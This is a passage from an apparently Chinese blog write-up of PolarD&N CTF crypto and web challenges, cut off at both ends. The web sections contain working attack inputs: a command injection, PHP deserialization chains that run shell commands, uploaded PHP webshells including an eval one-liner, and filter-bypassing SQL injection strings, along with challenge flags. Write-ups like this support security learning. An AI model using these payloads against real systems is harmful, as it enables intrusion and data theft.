¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？</span><br></pre></td></tr></table></figure><p>同时发现密钥： <code>2,5,1,3,6,4,9,7,8,14,10,13,11,12</code><br />阴阳怪气解码得<code>88421048040142242012210140881088421010882010884208842101</code><br />8421，云影密码得到，密文：<code>WLDOFEQWARAVWA</code><br />网上抄过来的n手脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">table = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">12</span>]</span><br><span class="line">Ciphertext = <span class="string">&#x27;WLDOFEQWARAVWA&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;zhuanlun.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"><span class="comment"># 转轮机根据table重新排列</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wheel_decode</span>(<span class="params">data, table</span>):</span><br><span class="line">    resultList = []</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;[A-Z]&#123;26&#125;&#x27;</span>)</span><br><span class="line">    result = pattern.findall(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        resultList.append(result[i-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> resultList</span><br><span class="line">resultList = wheel_decode(data, table)</span><br><span class="line"><span class="comment"># 根据密文重新排列</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rearrange</span>(<span class="params"><span class="type">List</span>, Ciphertext</span>):</span><br><span class="line">    resultList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">14</span>):</span><br><span class="line">        resultList.append(<span class="type">List</span>[i][<span class="type">List</span>[i].find(</span><br><span class="line">            Ciphertext[i]):]+<span class="type">List</span>[i][:<span class="type">List</span>[i].find(Ciphertext[i])])</span><br><span class="line">    <span class="keyword">return</span> resultList</span><br><span class="line">resultList = rearrange(resultList, Ciphertext)</span><br><span class="line"><span class="comment"># 选取每一列，列出结果</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rearrange2</span>(<span class="params"><span class="type">List</span></span>):</span><br><span class="line">    resultList = []</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">            s += j[i]</span><br><span class="line"></span><br><span class="line">        resultList.append(s)</span><br><span class="line">        s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> resultList</span><br><span class="line">resultList = rearrange2(resultList)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> resultList:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>发现可疑字符串，<code>FIAGISPQEOUPCS</code><br />问了一下客服，得md5加密套上flag。。。(题目描述也没有说，但polar真的很喜欢flag(md5(xxx)))<br /><code>flag&#123;fea3bc74edc5ab76ad9f09ea4f5ac233&#125;</code></p><h1 id="crypto歌词最后一句"><a class="markdownIt-Anchor" href="#crypto歌词最后一句"></a> 【CRYPTO】歌词最后一句</h1><p>附件的第一张图片是专辑《十一月的萧邦》的方面<br />跳舞的小人我解出来是<code>WYDOSNOWSB</code>，感觉没什么用啊<br />一首歌一首歌的试，试出的是第六首《枫》<code>我要的只是你在我身边</code><br />哈哈哈原谅我，挺喜欢周董的歌的，但听的是真不多<br />md5加密一下<br />flag: <code>flag&#123;776e26e39d01c914e8faa6796bf7e9b3&#125;</code><br />补充：看到某个不认识的佬的wp，发现我的小人解错了，O应该是Z，它这个小人背景有白有灰，给看漏眼了(逃)</p><h1 id="crypto离家出走的猫猫"><a class="markdownIt-Anchor" href="#crypto离家出走的猫猫"></a> 【CRYPTO】离家出走的猫猫</h1><p>喵语</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~呜喵呜呜~呜喵啊喵啊啊呜喵呜呜啊呜啊~呜呜~喵呜~~喵呜~啊呜啊呜喵呜呜喵~喵~~喵啊喵呜喵呜啊呜啊~呜啊~啊喵~~啊~~喵~啊啊~呜啊啊喵喵啊啊~啊啊啊~呜啊呜呜~呜啊啊~啊喵~呜喵~啊~喵啊呜呜喵~~喵啊~啊~呜~~喵~~~~呜~喵啊呜啊~~~~呜~啊喵呜呜啊啊喵呜喵~呜啊喵呜喵啊呜喵~~啊~~~喵啊啊呜呜呜喵喵~~呜呜呜呜啊喵啊啊啊~喵呜~呜啊喵~~呜~喵喵呜~喵啊~~喵~啊啊~呜喵~~啊~呜~啊呜呜喵啊喵~呜~喵呜~啊啊啊~喵喵啊~~啊~~呜喵~~呜呜~呜啊呜啊呜呜~喵啊喵喵呜呜啊啊~啊~~~呜~啊喵呜呜喵~~喵啊喵~啊~啊~~呜呜呜~喵呜~喵啊呜~喵呜喵喵喵啊喵喵呜喵~~呜喵~呜~喵~喵啊喵啊啊喵喵喵喵喵啊~呜啊~~喵~啊啊~呜呜呜啊呜喵喵啊啊~~啊啊~呜喵~呜~喵啊呜啊~喵啊喵~~~~啊呜喵~~喵啊喵呜啊~~啊~啊呜啊~啊~~啊~啊啊~~~呜~啊喵呜呜啊啊呜啊啊呜喵啊啊喵喵喵呜呜啊~呜啊喵喵~喵啊呜呜呜喵喵~~呜啊喵呜呜呜喵啊啊啊呜喵~呜~呜喵~~~呜~~啊呜啊~~喵~啊啊~呜啊呜喵~喵啊啊~呜喵~~喵啊~~呜呜呜呜喵啊喵呜呜呜~啊~呜~呜啊呜~喵~喵啊啊呜啊喵啊啊喵呜喵呜~~喵~~~~~~呜~啊喵呜啊</span><br></pre></td></tr></table></figure><p>找个网站<a href="https://roar.iiilab.com/">https://roar.iiilab.com/</a><br />得到<code>小小年内则伏勤，月明先自下高台。未似是非唇舌危，五弦一一为君调。一百二十个蜣螂，唯祝台星与福星。梁殿得非萧帝瑞，控鹤岭高星半隔。</code><br />到这就不会了，等wp喽<br />好家伙，官方视频说的是藏头诗递增，真脑洞，不过为什么不去misc<br />重新排版</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小小年内则伏勤，</span><br><span class="line">月明先自下高台。</span><br><span class="line">未似是非唇舌危，</span><br><span class="line">五弦一一为君调。</span><br><span class="line">一百二十个蜣螂，</span><br><span class="line">唯祝台星与福星。</span><br><span class="line">梁殿得非萧帝瑞，</span><br><span class="line">控鹤岭高星半隔。</span><br></pre></td></tr></table></figure><p>明文：<code>小明是一个福瑞控</code><br />知乎上关于福瑞控的介绍是，福瑞的原英文单词Furry，这个词汇的大概意义是多毛的，覆盖毛皮的，所以福瑞控说的是喜欢动物的人(对应题目猫猫)，但在互联网下，成了梗，喜欢拟人化动物的人。学到了，哈哈哈<br />MD5一下，套flag<br /><code>flag&#123;66f5c8a2577ffbcb6086e29df7b1bd70&#125;</code></p><h1 id="cryptokobe的祝福短信"><a class="markdownIt-Anchor" href="#cryptokobe的祝福短信"></a> 【CRYPTO】KOBE的祝福短信</h1><p>给了我们一张图片需要找对照表，和一个有密码的压缩包<br />我以为跟牢大关系不会很大吧，毕竟CTF这边我好像没见过什么密码跟牢大扯的上关系的。<br />好，一看，官方视频，KOBE CODE，在知乎那边有一个对照表，年份居然是20年2.20，属于自制密码吧，这也能被官方看到拿来出题了<br /><a href="https://www.zhihu.com/question/53100727">https://www.zhihu.com/question/53100727</a><br />解出来是<code>NUMBERONE</code>，得到九键密码<code>936382_232162_3163_4381 </code>，手机切换九键，第9格第3个y，依次类推，得到<code>you_can_do_it</code><br />好好好，收到牢大的祝福了，泪目<code>flag&#123;you_can_do_it&#125;</code></p><h1 id="web覆盖"><a class="markdownIt-Anchor" href="#web覆盖"></a> 【WEB】覆盖</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;www.baidu.com&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    @<span class="title function_ invoke__">parse_str</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span>[<span class="number">0</span>] == <span class="string">&#x27;www.polarctf.com&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> .= <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ping -c 2 &#x27;</span> . <span class="variable">$a</span>[<span class="number">0</span>] . <span class="variable">$ip</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$result&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;其实很简单！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>parse_str变量覆盖，这题跟去年冬季的Web-干正则基本一样<br /><code>?id=a[0]=www.polarctf.com&amp;cmd=127.0.0.1|cat flag.php</code><br />先<code>ls</code>一下，发现<code>flag.php</code><br />然后F12查看页面源代码即可</p><h1 id="webphp反序列化初试"><a class="markdownIt-Anchor" href="#webphp反序列化初试"></a> 【WEB】PHP反序列化初试</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evil</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$env</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;env = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$this</span>-&gt;evil);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;env;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>shell_exec函数相当于我们熟悉的system函数<br />发现<code>f1@g.php index.php </code><br />直接<code>cat f1@g.php</code><br />F12查看页面源代码即可</p><h1 id="web机器人"><a class="markdownIt-Anchor" href="#web机器人"></a> 【WEB】机器人</h1><p>/robots.txt得到前半截flag<code>flag&#123;4749ea1ea481a5d</code><br /><code>Disallow: /27f5e15b6af3223f1176293cd015771d</code><br />这个不可访问，说明这个路径下还藏了什么东西，看看flag.php给不给访问，访问<code>/27f5e15b6af3223f1176293cd015771d/flag.php</code><br />后半截：<code>56685442c8516b61c&#125;</code><br />flag: <code>flag&#123;4749ea1ea481a5d56685442c8516b61c&#125;</code></p><h1 id="webphp_deserialization"><a class="markdownIt-Anchor" href="#webphp_deserialization"></a> 【WEB】PHP_Deserialization</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PolarD&amp;N CTF</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Polar</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$night</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$night_arg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;night-&gt;<span class="title function_ invoke__">hacker</span>(<span class="variable">$this</span>-&gt;night_arg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Night</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wrong call:&quot;</span> . <span class="variable">$name</span> . <span class="string">&quot;  arg:&quot;</span> . <span class="variable">$arguments</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Day</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;polar&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;polar&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到filename进行了替换，我们这里用双写绕过，<code>$filename=&quot;flaflagg&quot;</code><br />然后需要触发Day类里面的__toString()方法，Polar类和Night类里面都有echo可以触发，这里我们利用Night类的，因为我们发现了Polar类里有个不知名函数<code>hacker()</code>，可以利用它来触发Night类里面的__call()方法，然后就可以触发__toString()了<br /><strong>Polar::__wakeup()-&gt;Night::__call()-&gt;Day::__toString()</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Polar</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;night = <span class="keyword">new</span> <span class="title class_">Night</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;night_arg = <span class="keyword">new</span> <span class="title class_">Day</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment"># Tzo1OiJQb2xhciI6Mjp7czo1OiJuaWdodCI7Tzo1OiJOaWdodCI6MTp7czo0OiJuYW1lIjtOO31zOjk6Im5pZ2h0X2FyZyI7TzozOiJEYXkiOjE6e3M6ODoiZmlsZW5hbWUiO3M6OToiL2ZsYWZsYWdnIjt9fQ==</span></span><br></pre></td></tr></table></figure><p>F12查看页面源代码即可</p><h1 id="webuploader"><a class="markdownIt-Anchor" href="#webuploader"></a> 【WEB】uploader</h1><p>好家伙，我没做过这种题emmmm<br />看了wp，需要自己写一个本地表单上传功能，新建一个.html文件</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- action的链接，是当前题目的上传文件的链接--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://ip:port/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>双击该文件，然后在本地上传PHP文件，<code>&lt;?php system('cat /flag');?&gt;</code><br />访问路径是，<code>$sandBox.&quot;/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]</code>，即<code>url/$sandBox/filename</code>，$sandBox在本地上传PHP文件后可以看到，因为它被输出了<br />最后F12查看页面源代码即可</p><h1 id="websearch"><a class="markdownIt-Anchor" href="#websearch"></a> 【WEB】search</h1><p>一眼SQL注入<br />尝试union注入，<code>1' union select 1,2,3#</code>，多试几个参数都没反应，可能存在过滤，尝试绕过<code>1'/**/Union/**/Select/**/1,2,3#</code>，报错信息<code>Error executing query: The used SELECT statements have a different number of columns</code>，有用<br /><code>1'/**/Union/**/Select/**/1,2,3,4,5#</code>，字段数为5的时候有回显<br />爆库名，<code>1'/**/Union/**/Select/**/1,database(),3,4,5#</code>，在第二列，库名为<code>CTF</code><br />爆表名，<code>1'/**/Union/**/Select/**/1,Group_concat(Table_name),3,4,5/**/From/**/Information_schema.tables/**/Where/**/Table_schema='CTF'#</code>，得到两个表<code>Flag,Students</code><br />爆Flag表的字段名，<code>1'/**/Union/**/Select/**/1,Group_concat(Column_name),3,4,5/**/From/**/Information_schema.columns/**/Where/**/Table_name='Flag'#</code>，得到<code>Flag</code><br />获取Flag字段内容，<code>1'/**/Union/**/Select/**/1,Group_concat(Flag),3,4,5/**/From/**/Flag#</code></p><p>第二种，报错注入<br /><code>1'/**/And/**/Extractvalue(1,Concat(0x7e,User(),0x7e,Database()))#</code>，爆出库名<code>XPATH syntax error: '~root@localhost~CTF'</code><br /><code>1'/**/And/**/Extractvalue(1,Concat(0x7e,(Select/**/Group_concat(Table_name)/**/From/**/Information_schema.tables/**/Where/**/Table_schema='CTF')))#</code>，爆出表名<code>XPATH syntax error: '~Flag,Students'</code><br />爆字段名，<code>1'/**/And/**/Extractvalue(1,Concat(0x7e,(Select/**/Group_concat(Column_name)/**/From/**/Information_schema.columns/**/Where/**/Table_schema='CTF'/**/And/**/Table_name='Flag')))#</code>，得到<code>XPATH syntax error: '~Flag'</code><br />获取值，<code>1'/**/And/**/Extractvalue(1,Concat(0x7e,(Select/**/Group_concat(Flag)/**/From/**/CTF.Flag)))#</code>，得到<code>XPATH syntax error: '~flag&#123;Polar_CTF_426891370wxbglbn'</code>，可见flag不完整<br />再逆一下，<code>1'/**/And/**/Extractvalue(1,Concat(0x7e,(Select/**/Reverse(Group_concat(Flag))/**/From/**/CTF.Flag)))#</code>，得到完整的flag</p><p>xpath报错注入有extractvalue和updatexml<br />extractvalue参考了Jay 17这位大佬的wp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=1&#x27;/**/and/**/uPdatexmL(1,coNcat(0x7e,(sELect/**/group_cOncat(Flag)/**/frOm/**/CTF.Flag),0x7e),3)#</span><br><span class="line">query=1&#x27;/**/and/**/uPdatexmL(1,coNcat(0x7e,(sELect/**/reverse(group_cOncat(Flag))/**/frOm/**/CTF.Flag),0x7e),3)#</span><br></pre></td></tr></table></figure><p>感觉二者差不多啊，有点细微的差别<br />有点神奇的是，我跟着网上的SQL报错注入，前一个跟着思路走，可以做出来<br />后面一个失败了，然后发现这道题，如果使用updatexml的话，updatexml的字母至少有两个大写字母，emmm为什么，好神奇啊</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/And/**/UpdatexmL(1,Concat(0x7e,User(),0x7e,Database(),0x7e,@@datadir),3)#</span><br><span class="line">1&#x27;/**/And/**/UpdatexmL(1,Concat(0x7e,(Select/**/Group_concat(Table_name)/**/From/**/Information_schema.tables/**/Where/**/Table_schema=&#x27;CTF&#x27;)),3)#</span><br><span class="line">1&#x27;/**/And/**/UpdatexmL(1,Concat(0x7e,(Select/**/Group_concat(Column_name)/**/From/**/Information_schema.columns/**/Where/**/Table_schema=&#x27;CTF&#x27;/**/And/**/Table_name=&#x27;Flag&#x27;)),3)#</span><br><span class="line">1&#x27;/**/And/**/UpdatexmL(1,Concat(0x7e,(Select/**/Group_concat(Flag)/**/From/**/CTF.Flag)),3)#</span><br><span class="line">1&#x27;/**/And/**/UpdatexmL(1,Concat(0x7e,(Select/**/Reverse(Group_concat(Flag))/**/From/**/CTF.Flag)),3)#</span><br></pre></td></tr></table></figure><h1 id="webfile"><a class="markdownIt-Anchor" href="#webfile"></a> 【WEB】file</h1><p>dirsearch一下发现,<code>upload.php和uploaded</code>，一个是文件上传界面，一个是上传的文件保存的地方<br />进行文件上传，此处没有后缀名检查，直接上传PHP文件，但是重发包，修改<code>Content-Type: image/jpeg</code>，没有后缀检查但一般得检查文件内容的类型，改成这样就OK了<br />php文件内容为：<code>&lt;?php system(&quot;cat /flag&quot;);?&gt;</code><br />去uploaded找到php文件，点击即可获得flag<br />以上操作可以不用bp，在火狐浏览器上面也可以操作，算是比较方便<br />同样，也可以选择上传一句话木马<code>&lt;?php eval($_POST[a]);?&gt;</code>，操作同上，然后拿蚁剑进行连接，最后找flag的时候，直接去根目录下找就OK了</p><h1 id="webplaygame"><a class="markdownIt-Anchor" href="#webplaygame"></a> 【WEB】PlayGame</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PolarD&amp;N CTF</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span 